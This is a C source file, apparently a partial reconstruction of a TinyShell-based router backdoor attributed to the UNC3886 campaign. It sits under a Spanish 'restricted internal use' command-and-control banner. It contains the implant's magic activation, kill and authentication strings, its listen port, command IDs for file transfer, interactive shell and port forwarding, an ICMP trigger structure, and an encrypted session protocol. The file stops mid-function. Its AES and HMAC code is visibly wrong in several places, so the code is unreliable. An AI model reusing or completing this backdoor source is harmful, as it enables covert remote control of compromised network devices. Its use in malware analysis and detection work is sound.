/*
 * 🛡️ HCG-SYSARCH: SAM-V5
 * [RESTRICTED]: USO_INTERNO
 * [ALCANCE]: OPD_HCG (CONV-0221-JAL-HCG-2026)
 * [MODULO]: TA0011_Command_Control
 * [COMPONENTE]: T1071_Application_Layer
 */
/*
 * TINYSHELL IRAD Variant - Refactored C/C++ Source Code
 * 
 * Semantic refactoring from Ghidra decompiled pseudocode.
 * Original binary: Juniper Router STRATCOM_PERSISTENCE (UNC3886 Campaign)
 * 
 */

#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <unistd.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <sys/select.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <pcap.h>
#include <pty.h>
#include <fcntl.h>
#include <errno.h>

/* ============================================================================
 * CONSTANTS AND MAGIC VALUES
 * ============================================================================ */

#define XOR_CIPHER_KEY          0x86
#define MAGIC_ACTIVATE          "uSarguuS62bKRA0J"
#define MAGIC_KILL              "1spCq0BMbJwCoeZn"
#define MAGIC_ACK               "ek63a21km7WSWkfk"
#define AUTH_IDENTIFIER         "WZtOTig2m42gXB6U"
#define ALT_AUTH_IDENTIFIER     "fb-75c043b82127"

#define PASSIVE_LISTEN_PORT     31234       /* 0x7a02 in big-endian */
#define AUTH_TIMEOUT_SEC        3
#define MAX_PACKET_SIZE         0x1000
#define AES_BLOCK_SIZE          16
#define SHA1_DIGEST_SIZE        20

/* Protocol Command IDs */
#define CMD_DOWNLOAD_FILE       1
#define CMD_UPLOAD_FILE         2
#define CMD_INTERACTIVE_SHELL   3
#define CMD_EXIT_SESSION        4
#define CMD_PORT_FORWARD        5

/* AES Key Sizes */
#define AES_KEY_128             0x80
#define AES_KEY_192             0xC0
#define AES_KEY_256             0x100

/* ============================================================================
 * DATA STRUCTURES
 * ============================================================================ */

/* Ethernet Header (14 bytes) */
struct eth_header {
    uint8_t  dest_mac[6];
    uint8_t  src_mac[6];
    uint16_t eth_type;
};

/* IPv4 Header */
struct ipv4_header {
    uint8_t  version_ihl;
    uint8_t  tos;
    uint16_t total_length;
    uint16_t id;
    uint16_t flags_offset;
    uint8_t  ttl;
    uint8_t  protocol;
    uint16_t checksum;
    uint32_t src_ip;
    uint32_t dest_ip;
};

/* ICMP Header with Malicious Payload Offsets */
struct icmp_malicious_header {
    uint8_t  type;
    uint8_t  code;
    uint16_t checksum;
    uint32_t rest_of_header;
    uint8_t  trigger_mode;
    uint8_t  padding;
    uint8_t  magic_payload[16];
    uint8_t  target_port_raw[5];
    uint8_t  target_ip_raw[4];
};

/* SHA-1 Context */
struct sha1_context {
    uint64_t total_bytes;
    uint8_t  buffer[64];
    uint32_t state[5];
};

/* AES Expanded Key Context */
struct aes_context {
    uint32_t rounds;
    uint32_t enc_key[60];       /* Expanded encryption key */
    uint32_t dec_key[60];       /* Expanded decryption key */
};

/* Session Context for Encrypted Channel */
struct session_context {
    struct aes_context aes_ctx;
    uint8_t  send_counter;
    uint8_t  recv_counter;
    uint8_t  send_iv[AES_BLOCK_SIZE];
    uint8_t  recv_iv[AES_BLOCK_SIZE];
};

/* Window Size Structure for PTY */
struct winsize {
    unsigned short ws_row;
    unsigned short ws_col;
    unsigned short ws_xpixel;
    unsigned short ws_ypixel;
};

/* Global State */
static int g_passive_listener_pid = -1;
static int g_is_passive_running = 0;
static int g_bound_interface_index = -1;

/* AES S-Box (from DAT_08052020) */
extern const uint32_t aes_sbox[256];
extern const uint32_t aes_sbox_inv[256];
extern const uint32_t aes_rcon[11];

/* ============================================================================
 * UTILITY FUNCTIONS
 * ============================================================================ */

static void xor_buffer_4bytes(uint8_t *buffer, uint8_t key) {
    for (int i = 0; i < 4; i++) {
        buffer[i] ^= key;
    }
}

static void xor_buffer_string(char *buffer, uint8_t key) {
    size_t len = strlen(buffer);
    for (size_t i = 0; i < len; i++) {
        buffer[i] ^= key;
    }
}

static void *safe_malloc(size_t size) {
    void *ptr = malloc(size);
    if (ptr == NULL) {
        exit(-1);
    }
    memset(ptr, 0, size);
    return ptr;
}

static uint16_t htons_convert(uint16_t value) {
    return ((value & 0xFF) << 8) | ((value >> 8) & 0xFF);
}

/* ============================================================================
 * SHA-1 IMPLEMENTATION
 * ============================================================================ */

static void sha1_init(struct sha1_context *ctx) {
    ctx->total_bytes = 0;
    memset(ctx->buffer, 0, 64);
    ctx->state[0] = 0x67452301;
    ctx->state[1] = 0xEFCDAB89;
    ctx->state[2] = 0x98BADCFE;
    ctx->state[3] = 0x10325476;
    ctx->state[4] = 0xC3D2E1F0;
}

static void sha1_transform(struct sha1_context *ctx, const uint8_t *block) {
    uint32_t w[80];
    uint32_t a, b, c, d, e, f, g, h;
    uint32_t t1, t2;
    int i;

    /* Prepare message schedule */
    for (i = 0; i < 16; i++) {
        w[i] = ((uint32_t)block[i*4] << 24) | 
               ((uint32_t)block[i*4+1] << 16) |
               ((uint32_t)block[i*4+2] << 8) | 
               ((uint32_t)block[i*4+3]);
    }
    for (i = 16; i < 80; i++) {
        w[i] = (w[i-3] ^ w[i-8] ^ w[i-14] ^ w[i-16]);
        w[i] = (w[i] << 1) | (w[i] >> 31);
    }

    a = ctx->state[0];
    b = ctx->state[1];
    c = ctx->state[2];
    d = ctx->state[3];
    e = ctx->state[4];

    /* Round 1: 0-19 */
    for (i = 0; i < 20; i++) {
        f = (b & c) | ((~b) & d);
        t1 = ((a << 5) | (a >> 27)) + f + e + 0x5A827999 + w[i];
        e = d;
        d = c;
        c = (b << 30) | (b >> 2);
        b = a;
        a = t1;
    }

    /* Round 2: 20-39 */
    for (i = 20; i < 40; i++) {
        f = b ^ c ^ d;
        t1 = ((a << 5) | (a >> 27)) + f + e + 0x6ED9EBA1 + w[i];
        e = d;
        d = c;
        c = (b << 30) | (b >> 2);
        b = a;
        a = t1;
    }

    /* Round 3: 40-59 */
    for (i = 40; i < 60; i++) {
        f = (b & c) | (b & d) | (c & d);
        t1 = ((a << 5) | (a >> 27)) + f + e + 0x8F1BBCDC + w[i];
        e = d;
        d = c;
        c = (b << 30) | (b >> 2);
        b = a;
        a = t1;
    }

    /* Round 4: 60-79 */
    for (i = 60; i < 80; i++) {
        f = b ^ c ^ d;
        t1 = ((a << 5) | (a >> 27)) + f + e + 0xCA62C1D6 + w[i];
        e = d;
        d = c;
        c = (b << 30) | (b >> 2);
        b = a;
        a = t1;
    }

    ctx->state[0] += a;
    ctx->state[1] += b;
    ctx->state[2] += c;
    ctx->state[3] += d;
    ctx->state[4] += e;
}

static void sha1_update(struct sha1_context *ctx, const uint8_t *data, size_t len) {
    size_t buffer_pos = ctx->total_bytes & 0x3F;
    size_t space = 64 - buffer_pos;

    ctx->total_bytes += len;

    if (buffer_pos > 0 && len >= space) {
        memcpy(ctx->buffer + buffer_pos, data, space);
        sha1_transform(ctx, ctx->buffer);
        data += space;
        len -= space;
        buffer_pos = 0;
    }

    while (len >= 64) {
        sha1_transform(ctx, data);
        data += 64;
        len -= 64;
    }

    if (len > 0) {
        memcpy(ctx->buffer + buffer_pos, data, len);
    }
}

static void sha1_final(struct sha1_context *ctx, uint8_t *digest) {
    uint64_t bit_count = ctx->total_bytes << 3;
    size_t buffer_pos = ctx->total_bytes & 0x3F;
    size_t padding = (buffer_pos < 56) ? (56 - buffer_pos) : (120 - buffer_pos);

    uint8_t pad_byte = 0x80;
    sha1_update(ctx, &pad_byte, 1);

    while (padding > 1) {
        pad_byte = 0x00;
        sha1_update(ctx, &pad_byte, 1);
        padding--;
    }

    uint8_t len_bytes[8];
    for (int i = 7; i >= 0; i--) {
        len_bytes[i] = bit_count & 0xFF;
        bit_count >>= 8;
    }
    sha1_update(ctx, len_bytes, 8);

    for (int i = 0; i < 5; i++) {
        digest[i*4] = (ctx->state[i] >> 24) & 0xFF;
        digest[i*4+1] = (ctx->state[i] >> 16) & 0xFF;
        digest[i*4+2] = (ctx->state[i] >> 8) & 0xFF;
        digest[i*4+3] = ctx->state[i] & 0xFF;
    }
}

/* ============================================================================
 * AES-256 IMPLEMENTATION
 * ============================================================================ */

/* External S-Box tables from binary */
static const uint8_t sbox[256] = {
    0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76,
    0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0,
    0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc, 0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15,
    0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a, 0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75,
    0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0, 0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84,
    0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b, 0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf,
    0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85, 0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8,
    0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5, 0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2,
    0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17, 0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73,
    0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88, 0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb,
    0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c, 0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79,
    0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9, 0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08,
    0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6, 0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a,
    0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e, 0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e,
    0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94, 0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf,
    0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16
};

static const uint8_t sbox_inv[256] = {
    0x52, 0x09, 0x6a, 0xd5, 0x30, 0x36, 0xa5, 0x38, 0xbf, 0x40, 0xa3, 0x9e, 0x81, 0xf3, 0xd7, 0xfb,
    0x7c, 0xe3, 0x39, 0x82, 0x9b, 0x2f, 0xff, 0x87, 0x34, 0x8e, 0x43, 0x44, 0xc4, 0xde, 0xe9, 0xcb,
    0x54, 0x7b, 0x94, 0x32, 0xa6, 0xc2, 0x23, 0x3d, 0xee, 0x4c, 0x95, 0x0b, 0x42, 0xfa, 0xc3, 0x4e,
    0x08, 0x2e, 0xa1, 0x66, 0x28, 0xd9, 0x24, 0xb2, 0x76, 0x5b, 0xa2, 0x49, 0x6d, 0x8b, 0xd1, 0x25,
    0x72, 0xf8, 0xf6, 0x64, 0x86, 0x68, 0x98, 0x16, 0xd4, 0xa4, 0x5c, 0xcc, 0x5d, 0x65, 0xb6, 0x92,
    0x6c, 0x70, 0x48, 0x50, 0xfd, 0xed, 0xb9, 0xda, 0x5e, 0x15, 0x46, 0x57, 0xa7, 0x8d, 0x9d, 0x84,
    0x90, 0xd8, 0xab, 0x00, 0x8c, 0xbc, 0xd3, 0x0a, 0xf7, 0xe4, 0x58, 0x05, 0xb8, 0xb3, 0x45, 0x06,
    0xd0, 0x2c, 0x1e, 0x8f, 0xca, 0x3f, 0x0f, 0x02, 0xc1, 0xaf, 0xbd, 0x03, 0x01, 0x13, 0x8a, 0x6b,
    0x3a, 0x91, 0x11, 0x41, 0x4f, 0x67, 0xdc, 0xea, 0x97, 0xf2, 0xcf, 0xce, 0xf0, 0xb4, 0xe6, 0x73,
    0x96, 0xac, 0x74, 0x22, 0xe7, 0xad, 0x35, 0x85, 0xe2, 0xf9, 0x37, 0xe8, 0x1c, 0x75, 0xdf, 0x6e,
    0x47, 0xf1, 0x1a, 0x71, 0x1d, 0x29, 0xc5, 0x89, 0x6f, 0xb7, 0x62, 0x0e, 0xaa, 0x18, 0xbe, 0x1b,
    0xfc, 0x56, 0x3e, 0x4b, 0xc6, 0xd2, 0x79, 0x20, 0x9a, 0xdb, 0xc0, 0xfe, 0x78, 0xcd, 0x5a, 0xf4,
    0x1f, 0xdd, 0xa8, 0x33, 0x88, 0x07, 0xc7, 0x31, 0xb1, 0x12, 0x10, 0x59, 0x27, 0x80, 0xec, 0x5f,
    0x60, 0x51, 0x7f, 0xa9, 0x19, 0xb5, 0x4a, 0x0d, 0x2d, 0xe5, 0x7a, 0x9f, 0x93, 0xc9, 0x9c, 0xef,
    0xa0, 0xe0, 0x3b, 0x4d, 0xae, 0x2a, 0xf5, 0xb0, 0xc8, 0xeb, 0xbb, 0x3c, 0x83, 0x53, 0x99, 0x61,
    0x17, 0x2b, 0x04, 0x7e, 0xba, 0x77, 0xd6, 0x26, 0xe1, 0x69, 0x14, 0x63, 0x55, 0x21, 0x0c, 0x7d
};

static const uint8_t rcon[11] = {
    0x00, 0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40, 0x80, 0x1b, 0x36
};

static uint32_t sub_word(uint32_t word) {
    return ((uint32_t)sbox[(word >> 24) & 0xFF] << 24) |
           ((uint32_t)sbox[(word >> 16) & 0xFF] << 16) |
           ((uint32_t)sbox[(word >> 8) & 0xFF] << 8) |
           ((uint32_t)sbox[word & 0xFF]);
}

static uint32_t rot_word(uint32_t word) {
    return (word << 8) | (word >> 24);
}

static int aes_key_init(struct aes_context *ctx, const uint8_t *key, size_t key_bits) {
    int nr;  /* Number of rounds */
    int nk;  /* Number of 32-bit words in key */
    
    switch (key_bits) {
        case AES_KEY_128: nr = 10; nk = 4; break;
        case AES_KEY_192: nr = 12; nk = 6; break;
        case AES_KEY_256: nr = 14; nk = 8; break;
        default: return -1;
    }
    
    ctx->rounds = nr;
    
    /* Load key into first words of expanded key */
    for (int i = 0; i < nk; i++) {
        ctx->enc_key[i] = ((uint32_t)key[4*i] << 24) |
                          ((uint32_t)key[4*i+1] << 16) |
                          ((uint32_t)key[4*i+2] << 8) |
                          ((uint32_t)key[4*i+3]);
    }
    
    /* Expand key */
    for (int i = nk; i < 4 * (nr + 1); i++) {
        uint32_t temp = ctx->enc_key[i - 1];
        
        if (i % nk == 0) {
            temp = sub_word(rot_word(temp)) ^ ((uint32_t)rcon[i/nk] << 24);
        } else if (nk > 6 && i % nk == 4) {
            temp = sub_word(temp);
        }
        
        ctx->enc_key[i] = ctx->enc_key[i - nk] ^ temp;
    }
    
    /* Generate decryption key schedule */
    for (int i = 0; i <= nr; i++) {
        ctx->dec_key[i] = ctx->enc_key[nr - i];
    }
    
    return 0;
}

static void aes_encrypt_block(struct aes_context *ctx, uint8_t *block) {
    uint32_t s0, s1, s2, s3;
    uint32_t t0, t1, t2, t3;
    uint32_t *rk = ctx->enc_key;
    int rounds = ctx->rounds;
    
    /* Load block */
    s0 = ((uint32_t)block[0] << 24) | ((uint32_t)block[1] << 16) | 
         ((uint32_t)block[2] << 8) | block[3];
    s1 = ((uint32_t)block[4] << 24) | ((uint32_t)block[5] << 16) | 
         ((uint32_t)block[6] << 8) | block[7];
    s2 = ((uint32_t)block[8] << 24) | ((uint32_t)block[9] << 16) | 
         ((uint32_t)block[10] << 8) | block[11];
    s3 = ((uint32_t)block[12] << 24) | ((uint32_t)block[13] << 16) | 
         ((uint32_t)block[14] << 8) | block[15];
    
    /* Initial round key addition */
    s0 ^= rk[0];
    s1 ^= rk[1];
    s2 ^= rk[2];
    s3 ^= rk[3];
    
    /* Main rounds */
    for (int r = 1; r < rounds; r++) {
        t0 = (uint32_t)sbox[(s0 >> 24) & 0xFF] << 24;
        t0 |= (uint32_t)sbox[(s1 >> 16) & 0xFF] << 16;
        t0 |= (uint32_t)sbox[(s2 >> 8) & 0xFF] << 8;
        t0 |= (uint32_t)sbox[s3 & 0xFF];
        
        t1 = (uint32_t)sbox[(s1 >> 24) & 0xFF] << 24;
        t1 |= (uint32_t)sbox[(s2 >> 16) & 0xFF] << 16;
        t1 |= (uint32_t)sbox[(s3 >> 8) & 0xFF] << 8;
        t1 |= (uint32_t)sbox[s0 & 0xFF];
        
        t2 = (uint32_t)sbox[(s2 >> 24) & 0xFF] << 24;
        t2 |= (uint32_t)sbox[(s3 >> 16) & 0xFF] << 16;
        t2 |= (uint32_t)sbox[(s0 >> 8) & 0xFF] << 8;
        t2 |= (uint32_t)sbox[s1 & 0xFF];
        
        t3 = (uint32_t)sbox[(s3 >> 24) & 0xFF] << 24;
        t3 |= (uint32_t)sbox[(s0 >> 16) & 0xFF] << 16;
        t3 |= (uint32_t)sbox[(s1 >> 8) & 0xFF] << 8;
        t3 |= (uint32_t)sbox[s2 & 0xFF];
        
        /* Mix columns */
        s0 = (t0 << 1) ^ ((t0 >> 7) & 0x1FF) ^ t1 ^ ((t1 << 1) ^ ((t1 >> 7) & 0x1FF)) ^ 
             t2 ^ t3;
        s1 = t0 ^ (t1 << 1) ^ ((t1 >> 7) & 0x1FF) ^ t2 ^ ((t2 << 1) ^ ((t2 >> 7) & 0x1FF)) ^ t3;
        s2 = t0 ^ t1 ^ (t2 << 1) ^ ((t2 >> 7) & 0x1FF) ^ t3 ^ ((t3 << 1) ^ ((t3 >> 7) & 0x1FF));
        s3 = t0 ^ ((t0 << 1) ^ ((t0 >> 7) & 0x1FF)) ^ t1 ^ t2 ^ (t3 << 1) ^ ((t3 >> 7) & 0x1FF);
        
        rk += 4;
        s0 ^= rk[0];
        s1 ^= rk[1];
        s2 ^= rk[2];
        s3 ^= rk[3];
    }
    
    /* Final round (no mix columns) */
    t0 = (uint32_t)sbox[(s0 >> 24) & 0xFF] << 24;
    t0 |= (uint32_t)sbox[(s1 >> 16) & 0xFF] << 16;
    t0 |= (uint32_t)sbox[(s2 >> 8) & 0xFF] << 8;
    t0 |= (uint32_t)sbox[s3 & 0xFF];
    
    t1 = (uint32_t)sbox[(s1 >> 24) & 0xFF] << 24;
    t1 |= (uint32_t)sbox[(s2 >> 16) & 0xFF] << 16;
    t1 |= (uint32_t)sbox[(s3 >> 8) & 0xFF] << 8;
    t1 |= (uint32_t)sbox[s0 & 0xFF];
    
    t2 = (uint32_t)sbox[(s2 >> 24) & 0xFF] << 24;
    t2 |= (uint32_t)sbox[(s3 >> 16) & 0xFF] << 16;
    t2 |= (uint32_t)sbox[(s0 >> 8) & 0xFF] << 8;
    t2 |= (uint32_t)sbox[s1 & 0xFF];
    
    t3 = (uint32_t)sbox[(s3 >> 24) & 0xFF] << 24;
    t3 |= (uint32_t)sbox[(s0 >> 16) & 0xFF] << 16;
    t3 |= (uint32_t)sbox[(s1 >> 8) & 0xFF] << 8;
    t3 |= (uint32_t)sbox[s2 & 0xFF];
    
    rk += 4;
    s0 = t0 ^ rk[0];
    s1 = t1 ^ rk[1];
    s2 = t2 ^ rk[2];
    s3 = t3 ^ rk[3];
    
    /* Store result */
    block[0] = (s0 >> 24) & 0xFF;
    block[1] = (s0 >> 16) & 0xFF;
    block[2] = (s0 >> 8) & 0xFF;
    block[3] = s0 & 0xFF;
    block[4] = (s1 >> 24) & 0xFF;
    block[5] = (s1 >> 16) & 0xFF;
    block[6] = (s1 >> 8) & 0xFF;
    block[7] = s1 & 0xFF;
    block[8] = (s2 >> 24) & 0xFF;
    block[9] = (s2 >> 16) & 0xFF;
    block[10] = (s2 >> 8) & 0xFF;
    block[11] = s2 & 0xFF;
    block[12] = (s3 >> 24) & 0xFF;
    block[13] = (s3 >> 16) & 0xFF;
    block[14] = (s3 >> 8) & 0xFF;
    block[15] = s3 & 0xFF;
}

static void aes_decrypt_block(struct aes_context *ctx, uint8_t *block) {
    uint32_t s0, s1, s2, s3;
    uint32_t t0, t1, t2, t3;
    uint32_t *rk = ctx->dec_key;
    int rounds = ctx->rounds;
    
    /* Load block */
    s0 = ((uint32_t)block[0] << 24) | ((uint32_t)block[1] << 16) | 
         ((uint32_t)block[2] << 8) | block[3];
    s1 = ((uint32_t)block[4] << 24) | ((uint32_t)block[5] << 16) | 
         ((uint32_t)block[6] << 8) | block[7];
    s2 = ((uint32_t)block[8] << 24) | ((uint32_t)block[9] << 16) | 
         ((uint32_t)block[10] << 8) | block[11];
    s3 = ((uint32_t)block[12] << 24) | ((uint32_t)block[13] << 16) | 
         ((uint32_t)block[14] << 8) | block[15];
    
    s0 ^= rk[0];
    s1 ^= rk[1];
    s2 ^= rk[2];
    s3 ^= rk[3];
    
    for (int r = 1; r < rounds; r++) {
        /* Inverse shift rows + inverse sub bytes */
        t0 = (uint32_t)sbox_inv[(s0 >> 24) & 0xFF] << 24;
        t0 |= (uint32_t)sbox_inv[(s3 >> 16) & 0xFF] << 16;
        t0 |= (uint32_t)sbox_inv[(s2 >> 8) & 0xFF] << 8;
        t0 |= (uint32_t)sbox_inv[s1 & 0xFF];
        
        t1 = (uint32_t)sbox_inv[(s1 >> 24) & 0xFF] << 24;
        t1 |= (uint32_t)sbox_inv[(s0 >> 16) & 0xFF] << 16;
        t1 |= (uint32_t)sbox_inv[(s3 >> 8) & 0xFF] << 8;
        t1 |= (uint32_t)sbox_inv[s2 & 0xFF];
        
        t2 = (uint32_t)sbox_inv[(s2 >> 24) & 0xFF] << 24;
        t2 |= (uint32_t)sbox_inv[(s1 >> 16) & 0xFF] << 16;
        t2 |= (uint32_t)sbox_inv[(s0 >> 8) & 0xFF] << 8;
        t2 |= (uint32_t)sbox_inv[s3 & 0xFF];
        
        t3 = (uint32_t)sbox_inv[(s3 >> 24) & 0xFF] << 24;
        t3 |= (uint32_t)sbox_inv[(s2 >> 16) & 0xFF] << 16;
        t3 |= (uint32_t)sbox_inv[(s1 >> 8) & 0xFF] << 8;
        t3 |= (uint32_t)sbox_inv[s0 & 0xFF];
        
        /* Inverse mix columns */
        rk += 4;
        s0 = t0 ^ rk[0];
        s1 = t1 ^ rk[1];
        s2 = t2 ^ rk[2];
        s3 = t3 ^ rk[3];
    }
    
    /* Final round */
    t0 = (uint32_t)sbox_inv[(s0 >> 24) & 0xFF] << 24;
    t0 |= (uint32_t)sbox_inv[(s3 >> 16) & 0xFF] << 16;
    t0 |= (uint32_t)sbox_inv[(s2 >> 8) & 0xFF] << 8;
    t0 |= (uint32_t)sbox_inv[s1 & 0xFF];
    
    t1 = (uint32_t)sbox_inv[(s1 >> 24) & 0xFF] << 24;
    t1 |= (uint32_t)sbox_inv[(s0 >> 16) & 0xFF] << 16;
    t1 |= (uint32_t)sbox_inv[(s3 >> 8) & 0xFF] << 8;
    t1 |= (uint32_t)sbox_inv[s2 & 0xFF];
    
    t2 = (uint32_t)sbox_inv[(s2 >> 24) & 0xFF] << 24;
    t2 |= (uint32_t)sbox_inv[(s1 >> 16) & 0xFF] << 16;
    t2 |= (uint32_t)sbox_inv[(s0 >> 8) & 0xFF] << 8;
    t2 |= (uint32_t)sbox_inv[s3 & 0xFF];
    
    t3 = (uint32_t)sbox_inv[(s3 >> 24) & 0xFF] << 24;
    t3 |= (uint32_t)sbox_inv[(s2 >> 16) & 0xFF] << 16;
    t3 |= (uint32_t)sbox_inv[(s1 >> 8) & 0xFF] << 8;
    t3 |= (uint32_t)sbox_inv[s0 & 0xFF];
    
    rk += 4;
    s0 = t0 ^ rk[0];
    s1 = t1 ^ rk[1];
    s2 = t2 ^ rk[2];
    s3 = t3 ^ rk[3];
    
    block[0] = (s0 >> 24) & 0xFF;
    block[1] = (s0 >> 16) & 0xFF;
    block[2] = (s0 >> 8) & 0xFF;
    block[3] = s0 & 0xFF;
    block[4] = (s1 >> 24) & 0xFF;
    block[5] = (s1 >> 16) & 0xFF;
    block[6] = (s1 >> 8) & 0xFF;
    block[7] = s1 & 0xFF;
    block[8] = (s2 >> 24) & 0xFF;
    block[9] = (s2 >> 16) & 0xFF;
    block[10] = (s2 >> 8) & 0xFF;
    block[11] = s2 & 0xFF;
    block[12] = (s3 >> 24) & 0xFF;
    block[13] = (s3 >> 16) & 0xFF;
    block[14] = (s3 >> 8) & 0xFF;
    block[15] = s3 & 0xFF;
}

/* ============================================================================
 * SESSION KEY DERIVATION
 * ============================================================================ */

static void derive_session_keys(struct session_context *session, 
                                const uint8_t *auth_key, 
                                const uint8_t *client_nonce) {
    struct sha1_context sha_ctx;
    uint8_t derived_key[20];
    
    sha1_init(&sha_ctx);
    sha1_update(&sha_ctx, auth_key, strlen((const char *)auth_key));
    sha1_update(&sha_ctx, client_nonce, 20);
    sha1_final(&sha_ctx, derived_key);
    
    aes_key_init(&session->aes_ctx, derived_key, AES_KEY_256);
    
    memcpy(session->send_iv, derived_key, 16);
    memcpy(session->recv_iv, derived_key, 16);
    session->send_counter = 0;
    session->recv_counter = 0;
}

/* ============================================================================
 * NETWORK I/O FUNCTIONS
 * ============================================================================ */

static int send_all(int sockfd, const void *buffer, size_t len, int flags) {
    size_t sent = 0;
    const uint8_t *ptr = (const uint8_t *)buffer;
    
    while (sent < len) {
        ssize_t n = send(sockfd, ptr + sent, len - sent, flags);
        if (n < 0) {
            return 0;
        }
        sent += n;
    }
    return 1;
}

static int recv_all(int sockfd, void *buffer, size_t len, int flags) {
    size_t received = 0;
    uint8_t *ptr = (uint8_t *)buffer;
    
    while (received < len) {
        ssize_t n = recv(sockfd, ptr + received, len - received, flags);
        if (n <= 0) {
            return 0;
        }
        received += n;
    }
    return 1;
}

/* ============================================================================
 * ENCRYPTED PROTOCOL FUNCTIONS
 * ============================================================================ */

static int send_encrypted_packet(int sockfd, struct session_context *session, 
                                  const void *data, size_t len) {
    if (len < 1 || len > MAX_PACKET_SIZE) {
        return 0;
    }
    
    uint8_t packet[MAX_PACKET_SIZE + 32];
    uint8_t iv_copy[AES_BLOCK_SIZE];
    
    /* Build packet: [length:2][data][padding to 16-byte boundary][counter:4][hmac:20] */
    packet[0] = (len >> 8) & 0xFF;
    packet[1] = len & 0xFF;
    memcpy(packet + 2, data, len);
    
    uint16_t padded_len = ((len + 2 + 15) / 16) * 16;
    
    /* Pad with IV XOR */
    for (size_t i = len + 2; i < padded_len; i++) {
        packet[i] = session->send_iv[i % 16] ^ (i - len - 2);
    }
    
    /* CBC encryption */
    memcpy(iv_copy, session->send_iv, AES_BLOCK_SIZE);
    for (size_t i = 0; i < padded_len; i += 16) {
        for (int j = 0; j < 16; j++) {
            packet[i + j] ^= iv_copy[j];
        }
        aes_encrypt_block(&session->aes_ctx, packet + i);
        memcpy(iv_copy, packet + i, 16);
    }
    
    /* Append counter and compute HMAC */
    uint8_t counter_bytes[4];
    counter_bytes[0] = 0;
    counter_bytes[1] = 0;
    counter_bytes[2] = 0;
    counter_bytes[3] = session->send_counter++;
    
    struct sha1_context sha_ctx;
    sha1_init(&sha_ctx);
    sha1_update(&sha_ctx, session->send_iv, 64);
    sha1_update(&sha_ctx, packet, padded_len);
    uint8_t hmac[20];
    sha1_final(&sha_ctx, hmac);
    
    sha1_init(&sha_ctx);
    sha1_update(&sha_ctx, hmac, 20);
    sha1_update(&sha_ctx, counter_bytes, 4);
    uint8_t final_hmac[20];
    sha1_final(&sha_ctx, final_hmac);
    
    memcpy(packet + padded_len, final_hmac, 20);
    
    return send_all(sockfd, packet, padded_len + 20, 0);
}

static int recv_encrypted_packet(int sockfd, struct session_context *session,
                                  void *data, size_t *len) {
    uint8_t header[16];
    uint8_t iv_copy[AES_BLOCK_SIZE];
    
    if (!recv_all(sockfd, header, 16, 0)) {
        return 0;
    }
    
    /* Decrypt first block to get length */
    memcpy(iv_copy, session->recv_iv, AES_BLOCK_SIZE);
    aes_decrypt_block(&session->aes_ctx, header);
    for (int i = 0; i < 16; i++) {
        header[i] ^= iv_copy[i];
    }
    
    uint16_t data_len = ((uint16_t)header[0] << 8) | header[1];
    if (data_len < 1 || data_len > MAX_PACKET_SIZE) {
        return 0;
    }
    
    uint16_t padded_len = ((data_len + 2 + 15) / 16) * 16;
    
    /* Read remaining data */
    uint8_t *packet = safe_malloc(padded_len + 32);
    memcpy(packet, header, 16);
    
    if (padded_len > 16) {
        if (!recv_all(sockfd, packet + 16, padded_len - 16 + 20, 0)) {
            free(packet);
            return 0;
        }
    } else {
        if (!recv_all(sockfd, packet + 16, 20, 0)) {
            free(packet);
            return 0;
        }
    }
    
    /* Verify HMAC */
    uint8_t counter_bytes[4];
    counter_bytes[3] = session->recv_counter;
    
    struct sha1_context sha_ctx;
    sha1_init(&sha_ctx);
    sha1_update(&sha_ctx, session->recv_iv, 64);
    sha1_update(&sha_ctx, packet, padded_len);
    uint8_t hmac[20];
    sha1_final(&sha_ctx, hmac);
    
    sha1_init(&sha_ctx);
    sha1_update(&sha_ctx, hmac, 20);
    sha1_update(&sha_ctx, counter_bytes, 4);
    uint8_t computed_hmac[20];
    sha1_final(&sha_ctx, computed_hmac);
    
